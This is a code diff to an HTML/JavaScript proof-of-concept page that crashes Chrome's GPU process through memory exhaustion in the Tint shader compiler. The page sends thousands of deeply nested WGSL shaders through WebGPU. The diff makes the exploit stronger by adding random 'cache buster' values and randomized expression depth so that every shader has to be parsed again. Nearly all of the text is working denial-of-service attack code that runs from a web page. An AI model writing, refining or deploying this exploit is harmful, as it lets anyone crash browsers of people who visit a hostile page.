@@ -5,8 +5,8 @@
     <style>body { font-family: monospace; background: #222; color: #0f0; font-size: 18px; }</style>
 </head>
 <body>
-    <h2>Tint AST Memory Exhaustion PoC</h2>
-    <p>Clicking the button will spam the GPU process. Wait ~30 seconds for the crash.</p>
+    <h2>Tint AST Memory Exhaustion PoC (Cache Bypassed)</h2>
+    <p>Clicking the button will spam the GPU process with unique payloads. Wait ~30 seconds.</p>
     <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white; cursor:pointer;">START GPU SPAM</button>
     <div id="status" style="margin-top: 20px;">Waiting...</div>
 
@@ -18,12 +18,17 @@
             const ops = ['+', '-', '*', '/'];
             const baseStr = "vec4<f32>(vec2<f32>(1.0, 1.0), vec2<f32>(1.0, 1.0)).x";
             
-            // 164 is the exact magic depth from your crash logs
-            for (let i = 0; i < 164; i++) {
-                const op = ops[i % 4]; 
+            // Jitter the depth to fragment the C++ heap and ensure unique trees
+            const depth = 160 + Math.floor(Math.random() * 15);
+            
+            for (let i = 0; i < depth; i++) {
+                const op = ops[Math.floor(Math.random() * ops.length)]; 
                 mathExpr = `(${mathExpr} ${op} ${baseStr})`;
             }
+            
+            // The Cache Buster: A random number guarantees Chrome cannot cache the parsing result!
             return `
+                // CACHE BUSTER: ${Math.random()}
                 @vertex fn vs_main() -> @builtin(position) vec4<f32> {
                     let crazy_var = ${mathExpr};
                     return vec4<f32>(crazy_var, 0.0, 0.0, 1.0);
@@ -40,27 +45,23 @@
             const adapter = await navigator.gpu.requestAdapter();
             const device = await adapter.requestDevice();
 
-            statusEl.innerText = "Building the magic payload...";
-            const killerWGSL = buildKillerShader();
-            
             let count = 0;
-            statusEl.innerText = "Spamming GPU Process to trigger SIGTRAP OOM...\nWait for the Aw, Snap!";
+            statusEl.innerText = "Bypassing Shader Cache and spamming Tint Compiler...\nWait for the Aw, Snap!";
 
-            // Fire the exact same shader 50 times every 10 milliseconds.
-            // This forces Tint to repeatedly abort and leak memory until it dies.
             setInterval(() => {
-                for (let i = 0; i < 50; i++) {
+                for (let i = 0; i < 25; i++) {
                     count++;
+                    const killerWGSL = buildKillerShader();
                     try {
+                        // Because of the cache buster, Chrome MUST parse this every single time
                         device.createShaderModule({ code: killerWGSL });
                     } catch (e) {
-                        // Ignore frontend JS errors
+                        // Ignore JS-side errors
                     }
                 }
                 
-                // Update screen every 1000 requests
-                if (count % 1000 === 0) {
-                    statusEl.innerText = `Sent ${count} payloads. GPU RAM filling up...`;
+                if (count % 500 === 0) {
+                    statusEl.innerText = `Bypassed Cache & Sent ${count} unique payloads. GPU RAM filling up...`;
                 }
             }, 10); 
         }
